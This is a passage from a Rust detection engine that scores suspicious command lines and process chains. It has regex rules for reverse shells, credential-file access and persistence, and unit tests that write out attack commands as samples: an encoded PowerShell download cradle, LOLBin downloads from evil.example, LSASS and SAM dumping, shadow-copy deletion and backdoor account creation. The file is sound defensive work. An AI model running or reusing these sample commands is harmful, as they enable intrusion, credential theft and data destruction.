        r"(?i)/dev/(?:tcp|udp)/[^\s/]+/\d+|\b(?:ba)?sh\s+-i\s*[>&]",
    ),
    r(
        "netcat_exec",
        "Netcat executing a shell",
        85,
        &["T1059"],
        r"(?i)\b(?:nc|ncat|netcat)(?:\.exe)?\b[^\r\n]*?\s-[ec]\s+\S*(?:sh|cmd(?:\.exe)?|powershell(?:\.exe)?)\b",
    ),
    r(
        "python_reverse_shell",
        "Python reverse shell",
        85,
        &["T1059.006"],
        r"(?i)\bpython[23]?(?:\.\d+)?\b[^\r\n]*?\s-c\b[^\r\n]*?socket[^\r\n]*?(?:subprocess|pty\.spawn|os\.dup2)",
    ),
    r(
        "base64_to_shell",
        "Base64 payload piped to a shell",
        65,
        &["T1140", "T1059.004"],
        r"(?i)base64\s+(?:-d|--decode)[^\r\n|]*\|\s*(?:ba|da|z)?sh\b",
    ),
    r(
        "history_tamper",
        "Shell history tampering",
        55,
        &["T1070.003"],
        r"(?i)\bhistory\s+-c\b|\bunset\s+histfile\b|histfile=/dev/null|export\s+histsize=0|\brm\b[^\r\n]*\.bash_history|\bln\s+-sf?\s+/dev/null\s+\S*history",
    ),
    r(
        "chmod_tmp",
        "Making a file in a temp directory executable",
        35,
        &[],
        r"(?i)\bchmod\s+(?:[ugoa]*\+[rw]*x|[0-7]{3,4})\s+(?:/tmp/|/dev/shm/|/var/tmp/)",
    ),
    r(
        "exec_from_tmp",
        "Execution from a temp directory",
        30,
        &[],
        r"(?:^|[\s;&|])(?:/tmp/|/dev/shm/|/var/tmp/)[\w.-]+",
    ),
    r(
        "cron_persistence",
        "Cron persistence",
        30,
        &["T1053.003"],
        r"(?i)\bcrontab\b[^\r\n]*?\s-(?:\s|$|e\b|r\b)|>>?\s*/etc/cron|/var/spool/cron",
    ),
    r(
        "unix_account_create",
        "Local account created",
        35,
        &["T1136.001"],
        r"(?i)\b(?:useradd|adduser)\b",
    ),
    r(
        "shadow_file_access",
        "/etc/shadow access",
        60,
        &["T1003.008"],
        r"(?i)\b(?:cat|less|more|head|tail|cp|scp|grep|awk|strings)\b[^\r\n]*?/etc/shadow\b|\bunshadow\b",
    ),
    r(
        "ssh_key_persistence",
        "SSH authorized_keys modified",
        55,
        &["T1098.004"],
        r"(?i)>>?\s*\S*\.ssh/authorized_keys",
    ),
    r(
        "firewall_flush_unix",
        "Host firewall flushed/disabled",
        50,
        &["T1562.004"],
        r"\b(?:iptables|ip6tables)\s+-(?:F|X)\b|\bufw\s+disable\b|\bsystemctl\s+(?:stop|disable)\s+(?:firewalld|ufw)\b",
    ),
    r(
        "selinux_disable",
        "SELinux disabled",
        50,
        &["T1562.001"],
        r"(?i)\bsetenforce\s+0\b|selinux=disabled",
    ),
    r(
        "ld_preload",
        "Dynamic linker hijacking (LD_PRELOAD)",
        50,
        &["T1574"],
        r"(?i)/etc/ld\.so\.preload|\bld_preload=",
    ),
];

static COMPILED: LazyLock<Vec<(&'static Rule, Regex)>> =
    LazyLock::new(|| RULES.iter().map(|rule| (rule, re(rule.pattern))).collect());

// Static patterns (see `common::re`).
static RE_PS_ENC: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r#"(?i)\b(?:powershell|pwsh)(?:_ise)?(?:\.exe)?\b[^\r\n]*?\s[-/\x{2013}\x{2014}\x{2015}]e(?:c|n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?)?)?)?)?)?)?)?\s+["']?([A-Za-z0-9+/]{8,}={0,2})"#,
    )
});
static RE_CONCAT: LazyLock<Regex> = LazyLock::new(|| re(r#"['"]\s*\+\s*['"]"#));
static RE_CHARCODE: LazyLock<Regex> =
    LazyLock::new(|| re(r"(?i)\[char\]\s*\(?\s*(?:0x[0-9a-f]+|[0-9]+)"));
static RE_KEYWORDS: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"(?i)powershell|invoke-expression|downloadstring|new-object|frombase64string|invoke-webrequest|bypass|hidden",
    )
});
static RE_TOKEN_SPLIT: LazyLock<Regex> = LazyLock::new(|| re(r#"[\s"'(),;\[\]{}|&<>`]+"#));

/// Lenient standard-alphabet base64 (padding optional, trailing bits allowed).
const B64: GeneralPurpose = GeneralPurpose::new(
    &base64::alphabet::STANDARD,
    GeneralPurposeConfig::new()
        .with_decode_allow_trailing_bits(true)
        .with_decode_padding_mode(DecodePaddingMode::Indifferent),
);
/// Lenient URL-safe base64.
const B64_URL: GeneralPurpose = GeneralPurpose::new(
    &base64::alphabet::URL_SAFE,
    GeneralPurposeConfig::new()
        .with_decode_allow_trailing_bits(true)
        .with_decode_padding_mode(DecodePaddingMode::Indifferent),
);

/// Shannon entropy in bits per character.
pub fn shannon_entropy(s: &str) -> f64 {
    let mut counts = std::collections::HashMap::new();
    let mut n = 0usize;
    for c in s.chars() {
        *counts.entry(c).or_insert(0usize) += 1;
        n += 1;
    }
    if n == 0 {
        return 0.0;
    }
    let n = n as f64;
    counts
        .values()
        .map(|&c| {
            let p = c as f64 / n;
            -p * p.log2()
        })
        .sum()
}

fn mostly_printable(s: &str) -> bool {
    let total = s.chars().count();
    if total < 4 {
        return false;
    }
    let printable = s
        .chars()
        .filter(|c| !c.is_control() || matches!(c, '\n' | '\r' | '\t'))
        .filter(|c| *c != '\u{fffd}')
        .count();
    printable * 10 >= total * 9
}

fn bytes_to_text(b: &[u8]) -> Option<String> {
    if b.len() >= 4 && b.len() % 2 == 0 {
        let zero_high = b.iter().skip(1).step_by(2).filter(|&&x| x == 0).count();
        if zero_high * 10 >= (b.len() / 2) * 7 {
            let units: Vec<u16> = b
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            let s = String::from_utf16_lossy(&units);
            return mostly_printable(&s).then_some(s);
        }
    }
    let s = String::from_utf8_lossy(b).into_owned();
    mostly_printable(&s).then_some(s)
}

/// Decode base64 (standard or URL-safe, padding optional) into text,
/// detecting UTF-16LE (PowerShell `-EncodedCommand`) vs UTF-8. Returns
/// `None` when the bytes are not mostly printable text.
pub fn decode_base64_text(s: &str) -> Option<String> {
    let cleaned: String = s.chars().filter(|c| !c.is_whitespace()).collect();
    if !cleaned.is_ascii() {
        return None;
    }
    let trimmed = cleaned.trim_end_matches('=');
    let bytes = B64
        .decode(trimmed)
        .or_else(|_| B64_URL.decode(trimmed))
        .or_else(|_| {
            // A dangling sextet (length % 4 == 1) is never valid; drop it.
            let cut = &trimmed[..trimmed.len().saturating_sub(1)];
            B64.decode(cut)
        })
        .ok()?;
    bytes_to_text(&bytes)
}

fn basename(path: &str) -> String {
    let p = path.trim().trim_matches('"');
    p.rsplit(['\\', '/'])
        .next()
        .unwrap_or(p)
        .trim()
        .to_ascii_lowercase()
}

/// Executable of a command line (basename, lowercase).
pub fn command_executable(cmd: &str) -> Option<String> {
    let t = cmd.trim_start();
    let first = if let Some(rest) = t.strip_prefix('"') {
        rest.split('"').next().unwrap_or(rest)
    } else {
        t.split_whitespace().next().unwrap_or("")
    };
    let b = basename(first);
    (!b.is_empty()).then_some(b)
}

fn severity_of(weight: u8) -> Severity {
    match weight {
        80.. => Severity::Critical,
        60..=79 => Severity::High,
        35..=59 => Severity::Medium,
        15..=34 => Severity::Low,
        _ => Severity::Informational,
    }
}

fn finding(id: &str, title: &str, weight: u8, techniques: &[&str], evidence: &str) -> CmdFinding {
    CmdFinding {
        id: id.to_string(),
        title: title.to_string(),
        severity: severity_of(weight),
        weight,
        techniques: techniques.iter().map(|t| t.to_string()).collect(),
        evidence: truncate_chars(evidence.trim(), 160),
    }
}

#[derive(Default)]
struct Acc {
    findings: Vec<CmdFinding>,
    decoded: Vec<DecodedPayload>,
}

impl Acc {
    fn add(&mut self, f: CmdFinding) {
        if let Some(e) = self.findings.iter_mut().find(|e| e.id == f.id) {
            if f.weight > e.weight {
                *e = f;
            }
        } else {
            self.findings.push(f);
        }
    }
    fn has(&self, id: &str) -> bool {
        self.findings.iter().any(|f| f.id == id)
    }
}

fn count_letter_pairs(text: &str, sep: char, exclude_next: &str) -> usize {
    let chars: Vec<char> = text.chars().collect();
    chars
        .windows(3)
        .filter(|w| {
            w[1] == sep
                && w[0].is_ascii_alphanumeric()
                && w[2].is_ascii_alphabetic()
                && !exclude_next.contains(w[2].to_ascii_lowercase())
        })
        .count()
}

fn case_switches(word: &str) -> usize {
    let letters: Vec<char> = word.chars().filter(|c| c.is_ascii_alphabetic()).collect();
    letters
        .windows(2)
        .filter(|w| w[0].is_ascii_uppercase() != w[1].is_ascii_uppercase())
        .count()
}

fn is_base64_token(t: &str) -> bool {
    let core = t.trim_end_matches('=');
    core.len() >= 40
        && core
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '-' | '_'))
        && core.chars().any(|c| c.is_ascii_uppercase())
        && core.chars().any(|c| c.is_ascii_lowercase())
        && core.chars().any(|c| c.is_ascii_digit())
}

fn push_payload(acc: &mut Acc, method: &str, encoded_len: usize, text: &str) {
    let truncated = text.chars().count() > MAX_DECODED_KEEP;
    acc.decoded.push(DecodedPayload {
        method: method.to_string(),
        encoded_length: encoded_len,
        text: truncate_chars(text, MAX_DECODED_KEEP),
        truncated,
    });
}

fn analyze_into(text: &str, depth: usize, acc: &mut Acc) {
    let prefix = if depth > 0 { "[decoded] " } else { "" };
    let add = |acc: &mut Acc, f: CmdFinding| {
        let mut f = f;
        if depth > 0 {
            f.evidence = format!("{prefix}{}", f.evidence);
        }
        acc.add(f);
    };

    for (rule, rx) in COMPILED.iter() {
        if let Some(m) = rx.find(text) {
            add(
                acc,
                finding(
                    rule.id,
                    rule.title,
                    rule.weight,
                    rule.techniques,
                    m.as_str(),
                ),
            );
        }
    }

    // PowerShell -EncodedCommand.
    let mut decoded_tokens: BTreeSet<String> = BTreeSet::new();
    for c in RE_PS_ENC.captures_iter(text) {
        let Some(b64) = c.get(1) else { continue };
        decoded_tokens.insert(b64.as_str().to_string());
        let snippet = c.get(0).map(|m| m.as_str()).unwrap_or("");
        add(
            acc,
            finding(
                "ps_encoded_command",
                "PowerShell encoded command",
                60,
                &["T1059.001", "T1027.010"],
                snippet,
            ),
        );
        if acc.decoded.len() >= MAX_PAYLOADS {
            continue;
        }
        if let Some(decoded) = decode_base64_text(b64.as_str()) {
            push_payload(
                acc,
                "powershell -EncodedCommand",
                b64.as_str().len(),
                &decoded,
            );
            if depth < MAX_DEPTH {
                analyze_into(&decoded, depth + 1, acc);
            }
        }
    }

    // Base64 literals.
    for tok in RE_TOKEN_SPLIT.split(text) {
        if decoded_tokens.contains(tok) || !is_base64_token(tok) {
            continue;
        }
        if acc.decoded.len() >= MAX_PAYLOADS {
            break;
        }
        if let Some(decoded) = decode_base64_text(tok) {
            decoded_tokens.insert(tok.to_string());
            add(
                acc,
                finding(
                    "base64_payload",
                    "Base64 literal decodes to text",
                    30,
                    &["T1027", "T1140"],
                    tok,
                ),
            );
            push_payload(acc, "base64 literal", tok.len(), &decoded);
            if depth < MAX_DEPTH {
                analyze_into(&decoded, depth + 1, acc);
            }
        }
    }

    // High-entropy tokens that did not decode to text (encrypted/compressed).
    if let Some(tok) = RE_TOKEN_SPLIT.split(text).find(|t| {
        t.len() >= 40
            && !decoded_tokens.contains(*t)
            // Paths, URLs and file names are not opaque blobs.
            && !t.contains(['\\', '.'])
            && !t.starts_with('/')
            && shannon_entropy(t) >= 4.8
    }) {
        add(
            acc,
            finding(
                "high_entropy_token",
                "High-entropy token (encoded or encrypted data)",
                20,
                &["T1027"],
                tok,
            ),
        );
    }

    // Character-level obfuscation.
    let carets = count_letter_pairs(text, '^', "");
    if carets >= 3 {
        add(
            acc,
            finding(
                "caret_obfuscation",
                "Caret (^) escape obfuscation",
                45,
                &["T1027.010"],
                &format!("{carets} caret-escaped letters"),
            ),
        );
    }
    let ticks = count_letter_pairs(text, '`', "0abefnrtuv");
    if ticks >= 2 {
        add(
            acc,
            finding(
                "backtick_obfuscation",
                "Backtick escape obfuscation",
                45,
                &["T1027.010"],
                &format!("{ticks} backtick-escaped letters"),
            ),
        );
    }
    let concats = RE_CONCAT.find_iter(text).count();
    if concats >= 3 {
        add(
            acc,
            finding(
                "concat_obfuscation",
                "String concatenation obfuscation",
                40,
                &["T1027.010"],
                &format!("{concats} string concatenations"),
            ),
        );
    }
    let chars = RE_CHARCODE.find_iter(text).count();
    if chars >= 3 {
        add(
            acc,
            finding(
                "charcode_obfuscation",
                "[char] code obfuscation",
                45,
                &["T1027.010"],
                &format!("{chars} [char] casts"),
            ),
        );
    }
    if let Some(m) = RE_KEYWORDS
        .find_iter(text)
        .find(|m| case_switches(m.as_str()) >= 5)
    {
        add(
            acc,
            finding(
                "random_case",
                "Random-case keyword obfuscation",
                20,
                &["T1027.010"],
                m.as_str(),
            ),
        );
    }

    // Combinations describe the whole command: evaluate once, at the top
    // level, after decoded payloads were analysed.
    if depth > 0 {
        return;
    }
    if acc.has("ps_download_cradle") && acc.has("ps_iex") {
        add(
            acc,
            finding(
                "download_execute",
                "Download-and-execute (fileless) pattern",
                65,
                &["T1105", "T1059.001"],
                "download cradle combined with Invoke-Expression",
            ),
        );
    }
    let ps_flags = [
        "ps_noprofile",
        "ps_noninteractive",
        "ps_hidden_window",
        "ps_exec_bypass",
        "ps_encoded_command",
    ]
    .iter()
    .filter(|id| acc.has(id))
    .count();
    if ps_flags >= 3 {
        add(
            acc,
            finding(
                "ps_flag_combo",
                "Classic malicious PowerShell flag combination",
                30,
                &["T1059.001"],
                &format!("{ps_flags} of -nop/-noni/-w hidden/-ep bypass/-enc"),
            ),
        );
    }
    let len = text.chars().count();
    if len > 4096 {
        add(
            acc,
            finding(
                "very_long_command",
                "Very long command line",
                20,
                &[],
                &format!("{len} characters"),
            ),
        );
    } else if len > 1024 {
        add(
            acc,
            finding(
                "long_command",
                "Long command line",
                10,
                &[],
                &format!("{len} characters"),
            ),
        );
    }
}

fn finish(text: &str, acc: Acc) -> CommandLineAnalysis {
    let mut findings = acc.findings;
    findings.sort_by(|a, b| b.weight.cmp(&a.weight).then_with(|| a.id.cmp(&b.id)));
    let remaining: f64 = findings
        .iter()
        .map(|f| 1.0 - f64::from(f.weight.min(100)) / 100.0)
        .product();
    let score = ((1.0 - remaining) * 100.0).round().clamp(0.0, 100.0) as u8;
    let techniques: BTreeSet<String> = findings
        .iter()
        .flat_map(|f| f.techniques.iter().cloned())
        .collect();
    CommandLineAnalysis {
        score,
        severity: Severity::from_score(score),
        executable: command_executable(text),
        length: text.chars().count(),
        entropy: (shannon_entropy(text) * 100.0).round() / 100.0,
        findings,
        decoded: acc.decoded,
        techniques: techniques.into_iter().collect(),
    }
}

fn clip(cmd: &str) -> &str {
    if cmd.len() <= MAX_ANALYZED_LEN {
        return cmd;
    }
    let mut end = MAX_ANALYZED_LEN;
    while !cmd.is_char_boundary(end) {
        end -= 1;
    }
    &cmd[..end]
}

/// Analyse a single command line.
pub fn analyze_command_line(cmd: &str) -> CommandLineAnalysis {
    let cmd = clip(cmd);
    let mut acc = Acc::default();
    analyze_into(cmd, 0, &mut acc);
    finish(cmd, acc)
}

const OFFICE: &[&str] = &[
    "winword.exe",
    "excel.exe",
    "powerpnt.exe",
    "outlook.exe",
    "onenote.exe",
    "msaccess.exe",
    "mspub.exe",
    "visio.exe",
];
const SHELLS_AND_LOLBINS: &[&str] = &[
    "cmd.exe",
    "powershell.exe",
    "pwsh.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "certutil.exe",
    "bitsadmin.exe",
    "schtasks.exe",
    "wmic.exe",
    "msiexec.exe",
    "curl.exe",
    "hh.exe",
    "msbuild.exe",
    "installutil.exe",
    "cmstp.exe",
    "forfiles.exe",
];
const SHELLS: &[&str] = &["cmd.exe", "powershell.exe", "pwsh.exe"];
const UNIX_SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "ksh"];
const SCRIPT_HOSTS: &[&str] = &["wscript.exe", "cscript.exe", "mshta.exe"];
const BROWSERS: &[&str] = &[
    "chrome.exe",
    "msedge.exe",
    "firefox.exe",
    "iexplore.exe",
    "brave.exe",
    "opera.exe",
];
/// Core Windows binaries and the directory they must live in.
const CORE_BINARIES: &[(&str, &str)] = &[
    ("svchost.exe", "system32"),
    ("lsass.exe", "system32"),
    ("lsaiso.exe", "system32"),
    ("csrss.exe", "system32"),
    ("winlogon.exe", "system32"),
    ("services.exe", "system32"),
    ("smss.exe", "system32"),
    ("wininit.exe", "system32"),
    ("taskhostw.exe", "system32"),
    ("spoolsv.exe", "system32"),
    ("dllhost.exe", "system32"),
    ("conhost.exe", "system32"),
    ("rundll32.exe", "system32"),
    ("regsvr32.exe", "system32"),
    ("cmd.exe", "system32"),
    ("mshta.exe", "system32"),
    ("searchindexer.exe", "system32"),
    ("runtimebroker.exe", "system32"),
    ("sihost.exe", "system32"),
    ("ctfmon.exe", "system32"),
    ("wmiprvse.exe", "system32"),
    ("explorer.exe", "windows"),
];
/// Distinctive names targeted by typo-squatting (`scvhost.exe`).
const TYPO_TARGETS: &[&str] = &[
    "svchost",
    "lsass",
    "csrss",
    "winlogon",
    "wininit",
    "spoolsv",
    "taskhostw",
    "explorer",
    "rundll32",
    "conhost",
    "dllhost",
    "lsaiso",
];
/// Legitimate names that are within one edit of a target.
const TYPO_ALLOW: &[&str] = &["taskhost", "taskhostex", "explore", "conhost"];
/// Core service processes that a user-land parent must never spawn.
const SERVICE_PROCESSES: &[&str] = &[
    "svchost.exe",
    "lsass.exe",
    "services.exe",
    "wininit.exe",
    "winlogon.exe",
    "csrss.exe",
    "smss.exe",
    "spoolsv.exe",
];
const USER_LAND_PARENTS: &[&str] = &[
    "explorer.exe",
    "cmd.exe",
    "powershell.exe",
    "pwsh.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "winword.exe",
    "excel.exe",
    "outlook.exe",
];
const USER_WRITABLE_DIRS: &[&str] = &[
    "\\appdata\\local\\temp\\",
    "\\users\\public\\",
    "\\windows\\temp\\",
    "\\$recycle.bin\\",
    "\\perflogs\\",
    "\\downloads\\",
    "/tmp/",
    "/dev/shm/",
    "/var/tmp/",
];

/// Damerau-Levenshtein distance (optimal string alignment), small inputs only.
fn edit_distance(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    let (n, m) = (a.len(), b.len());
    let mut d = vec![vec![0usize; m + 1]; n + 1];
    for (i, row) in d.iter_mut().enumerate() {
        row[0] = i;
    }
    for (j, cell) in d[0].iter_mut().enumerate() {
        *cell = j;
    }
    for i in 1..=n {
        for j in 1..=m {
            let cost = usize::from(a[i - 1] != b[j - 1]);
            let mut v = (d[i - 1][j] + 1)
                .min(d[i][j - 1] + 1)
                .min(d[i - 1][j - 1] + cost);
            if i > 1 && j > 1 && a[i - 1] == b[j - 2] && a[i - 2] == b[j - 1] {
                v = v.min(d[i - 2][j - 2] + 1);
            }
            d[i][j] = v;
        }
    }
    d[n][m]
}

fn in_user_writable_dir(path: &str) -> bool {
    let l = path.to_ascii_lowercase();
    USER_WRITABLE_DIRS.iter().any(|d| l.contains(d))
}

fn process_findings(ctx: &ProcessContext<'_>, acc: &mut Acc) {
    let image = ctx.image.map(basename);
    let parent = ctx.parent_image.map(basename);
    let (img, par) = (image.as_deref(), parent.as_deref());
    let chain = format!("{} -> {}", par.unwrap_or("?"), img.unwrap_or("?"));

    if let (Some(p), Some(c)) = (par, img) {
        if p == "eqnedt32.exe" {
            acc.add(finding(
                "equation_editor_spawn",
                "Equation Editor spawned a process (CVE-2017-11882 style exploit)",
                85,
                &["T1203"],
                &chain,
            ));
        }
        if OFFICE.contains(&p) && SHELLS_AND_LOLBINS.contains(&c) {
            acc.add(finding(
                "office_spawns_shell",
                "Office application spawned a shell/LOLBin (macro or exploit execution chain)",
                70,
                &["T1204.002"],
                &chain,
            ));
        }
        if p == "wmiprvse.exe" && (SHELLS.contains(&c) || SCRIPT_HOSTS.contains(&c)) {
            acc.add(finding(
                "wmi_spawns_shell",
                "WMI provider host spawned a shell (remote WMI execution)",
                45,
                &["T1047"],
                &chain,
            ));
        }
        if p == "services.exe" && SHELLS.contains(&c) {
            acc.add(finding(
                "service_spawns_shell",
                "Service Control Manager spawned a shell (service-based execution)",
                45,
                &["T1569.002"],
                &chain,
            ));
        }
        if SCRIPT_HOSTS.contains(&p)
            && (SHELLS.contains(&c)
                || [
                    "rundll32.exe",
                    "regsvr32.exe",
                    "certutil.exe",
                    "bitsadmin.exe",
                    "schtasks.exe",
                ]
                .contains(&c))
        {
            acc.add(finding(
                "script_host_spawns_shell",
                "Script host spawned a shell/LOLBin",
                50,
                &["T1059"],
                &chain,
            ));
        }
        let web = [
            "w3wp.exe",
            "httpd.exe",
            "nginx.exe",
            "php-cgi.exe",
            "php.exe",
            "httpd",
            "apache2",
            "nginx",
            "php-fpm",
        ];
        if (web.contains(&p) || p.starts_with("tomcat") || p.starts_with("php-fpm"))
            && (SHELLS.contains(&c)
                || UNIX_SHELLS.contains(&c)
                || c == "whoami.exe"
                || c == "net.exe")
        {
            acc.add(finding(
                "webserver_spawns_shell",
                "Web server spawned a shell (web shell)",
                75,
                &["T1505.003"],
                &chain,
            ));
        }
        if p == "sqlservr.exe" && SHELLS.contains(&c) {
            acc.add(finding(
                "sqlserver_spawns_shell",
                "SQL Server spawned a shell (xp_cmdshell)",
                70,
                &["T1505"],
                &chain,
            ));
        }
        if BROWSERS.contains(&p) && (SHELLS.contains(&c) || SCRIPT_HOSTS.contains(&c)) {
            acc.add(finding(
                "browser_spawns_shell",
                "Browser spawned a shell/script host",
                45,
                &[],
                &chain,
            ));
        }
        if SERVICE_PROCESSES.contains(&c)
            && (USER_LAND_PARENTS.contains(&p)
                || ctx.parent_image.is_some_and(in_user_writable_dir))
        {
            acc.add(finding("unexpected_parent", "Core system process spawned by an unexpected parent (masquerading or PPID spoofing)", 60, &["T1036"], &chain));
        }
    }

    if let (Some(path), Some(name)) = (ctx.image, img) {
        let lower = path.to_ascii_lowercase().replace('/', "\\");
        if let Some((_, dir)) = CORE_BINARIES.iter().find(|(n, _)| *n == name) {
            let ok = match *dir {
                "windows" => {
                    lower.ends_with("\\windows\\explorer.exe")
                        || lower.ends_with("\\windows\\syswow64\\explorer.exe")
                }
                _ => {
                    lower.contains("\\windows\\system32\\")
                        || lower.contains("\\windows\\syswow64\\")
                        || lower.contains("\\windows\\winsxs\\")
                        || lower.starts_with("\\systemroot\\system32\\")
                        || !lower.contains('\\')
                }
            };
            if !ok {
                acc.add(finding(
                    "masquerade_location",
                    "System binary name running from an unexpected directory",
                    70,
                    &["T1036"],
                    path,
                ));
            }
        } else {
            let stem = name.strip_suffix(".exe").unwrap_or(name);
            if stem.len() >= 5
                && !TYPO_ALLOW.contains(&stem)
                && TYPO_TARGETS
                    .iter()
                    .any(|t| *t != stem && edit_distance(stem, t) == 1)
            {
                acc.add(finding(
                    "masquerade_typo",
                    "Executable name imitates a Windows system binary",
                    60,
                    &["T1036"],
                    path,
                ));
            }
        }
        if in_user_writable_dir(path) {
            acc.add(finding(
                "user_writable_image",
                "Process running from a user-writable / temporary directory",
                25,
                &[],
                path,
            ));
        }
        if name == "rundll32.exe" {
            if let Some(cmd) = ctx.command_line {
                let after = cmd
                    .to_ascii_lowercase()
                    .split_once("rundll32")
                    .map(|(_, r)| {
                        r.trim_start_matches(".exe")
                            .trim_matches(['"', ' '])
                            .to_string()
                    })
                    .unwrap_or_default();
                if after.is_empty() {
                    acc.add(finding(
                        "rundll32_no_args",
                        "rundll32 without arguments (typical of injected beacon processes)",
                        35,
                        &["T1218.011"],
                        cmd,
                    ));
                }
            }
        }
    }
}

/// Analyse a process: command line heuristics plus parent/child,
/// masquerading and location checks.
pub fn analyze_process(ctx: &ProcessContext<'_>) -> CommandLineAnalysis {
    let cmd = clip(ctx.command_line.unwrap_or(""));
    let mut acc = Acc::default();
    if !cmd.is_empty() {
        analyze_into(cmd, 0, &mut acc);
    }
    process_findings(ctx, &mut acc);
    let mut a = finish(cmd, acc);
    if a.executable.is_none() {
        a.executable = ctx.image.map(basename);
    }
    a
}

#[cfg(test)]
mod tests {
    use super::*;
    use base64::engine::general_purpose::STANDARD;

    fn ids(a: &CommandLineAnalysis) -> Vec<&str> {
        a.findings.iter().map(|f| f.id.as_str()).collect()
    }

    fn ps_enc(script: &str) -> String {
        let utf16: Vec<u8> = script
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect();
        STANDARD.encode(utf16)
    }

    #[test]
    fn all_rules_compile_and_are_unique() {
        assert_eq!(COMPILED.len(), RULES.len());
        let mut seen = BTreeSet::new();
        for r in RULES {
            assert!(seen.insert(r.id), "duplicate rule id {}", r.id);
            assert!(r.weight <= 100);
            for t in r.techniques {
                assert!(
                    crate::mitre::technique(t).is_some(),
                    "rule {} uses unknown technique {t}",
                    r.id
                );
            }
        }
        for rx in [
            &RE_PS_ENC,
            &RE_CONCAT,
            &RE_CHARCODE,
            &RE_KEYWORDS,
            &RE_TOKEN_SPLIT,
        ] {
            LazyLock::force(rx);
        }
    }

    #[test]
    fn benign_commands_score_low() {
        for cmd in [
            "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",
            "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --lang=en-US",
            "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding",
            "/usr/bin/python3 /opt/app/manage.py runserver 0.0.0.0:8000",
            "ls -la /var/log",
        ] {
            let a = analyze_command_line(cmd);
            assert!(a.score < 15, "{cmd}: {} {:?}", a.score, ids(&a));
        }
    }

    #[test]
    fn encoded_powershell_is_decoded_and_analysed() {
        let payload = "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.4/a.ps1')";
        let cmd = format!(
            "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc {}",
            ps_enc(payload)
        );
        let a = analyze_command_line(&cmd);
        let i = ids(&a);
        for want in [
            "ps_encoded_command",
            "ps_hidden_window",
            "ps_exec_bypass",
            "ps_noprofile",
            "ps_noninteractive",
            "ps_flag_combo",
            "ps_download_cradle",
            "ps_iex",
            "download_execute",
        ] {
            assert!(i.contains(&want), "missing {want}: {i:?}");
        }
        assert_eq!(a.decoded.len(), 1);
        assert_eq!(a.decoded[0].text, payload);
        assert!(a.score >= 90, "{}", a.score);
        assert_eq!(a.severity, Severity::Critical);
        assert!(a.techniques.contains(&"T1059.001".to_string()));
        assert!(a.techniques.contains(&"T1105".to_string()));
        assert_eq!(a.executable.as_deref(), Some("powershell.exe"));
        let cradle = a.findings.iter().find(|f| f.id == "ps_download_cradle");
        assert!(cradle.is_some_and(|f| f.evidence.starts_with("[decoded] ")));
    }

    #[test]
    fn encoded_command_prefix_variants() {
        let b = ps_enc("Get-Process");
        for flag in [
            "-e",
            "-ec",
            "-en",
            "-enc",
            "-EncodedCommand",
            "/enc",
            "\u{2013}enc",
        ] {
            let a = analyze_command_line(&format!("powershell {flag} {b}"));
            assert!(ids(&a).contains(&"ps_encoded_command"), "{flag}");
            assert_eq!(
                a.decoded.first().map(|d| d.text.as_str()),
                Some("Get-Process"),
                "{flag}"
            );
        }
        // -ExecutionPolicy is not -EncodedCommand.
        let a = analyze_command_line("powershell -ep bypass -file x.ps1");
        assert!(!ids(&a).contains(&"ps_encoded_command"));
    }

    #[test]
    fn lolbins() {
        let cases: &[(&str, &str)] = &[
            (
                "certutil.exe -urlcache -split -f http://evil.example/p.exe C:\\Users\\Public\\p.exe",
                "certutil_download",
            ),
            ("certutil -decode enc.txt payload.exe", "certutil_decode"),
            (
                "mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\")",
                "mshta_remote",
            ),
            ("mshta http://evil.example/a.hta", "mshta_remote"),
            (
                "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert(1)",
                "rundll32_script",
            ),
            (
                "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full",
                "lsass_dump_comsvcs",
            ),
            (
                "rundll32.exe C:\\Users\\bob\\AppData\\Local\\Temp\\x.dll,Start",
                "rundll32_user_path",
            ),
            (
                "regsvr32 /s /n /u /i:http://evil.example/file.sct scrobj.dll",
                "regsvr32_scriptlet",
            ),
            (
                "bitsadmin /transfer job /download /priority high http://evil.example/a.exe C:\\a.exe",
                "bitsadmin_transfer",
            ),
            (
                "wmic /node:10.0.0.5 process call create \"cmd /c whoami\"",
                "wmic_process_create",
            ),
            (
                "wmic os get /format:\"https://evil.example/x.xsl\"",
                "wmic_xsl",
            ),
            (
                "schtasks /create /tn upd /tr C:\\Users\\Public\\u.exe /sc onlogon /ru SYSTEM",
                "schtasks_suspicious",
            ),
            (
                "vssadmin.exe Delete Shadows /All /Quiet",
                "shadow_copy_delete",
            ),
            ("wmic shadowcopy delete", "shadow_copy_delete"),
            ("wbadmin delete catalog -quiet", "backup_catalog_delete"),
            (
                "bcdedit /set {default} recoveryenabled No",
                "bcdedit_recovery_off",
            ),
            ("wevtutil cl Security", "clear_event_logs"),
            (
                "procdump64.exe -accepteula -ma lsass.exe out.dmp",
                "procdump_lsass",
            ),
            (
                "ntdsutil \"ac i ntds\" ifm \"create full c:\\temp\" q q",
                "ntds_dump",
            ),
            ("reg save HKLM\\SAM C:\\temp\\sam.save", "reg_save_hives"),
            ("net user backdoor P@ssw0rd! /add", "net_user_add"),
            (
                "net localgroup administrators backdoor /add",
                "net_group_add",
            ),
            ("net group \"Domain Admins\" /domain", "net_priv_group_enum"),
            ("whoami /all", "whoami_detailed"),
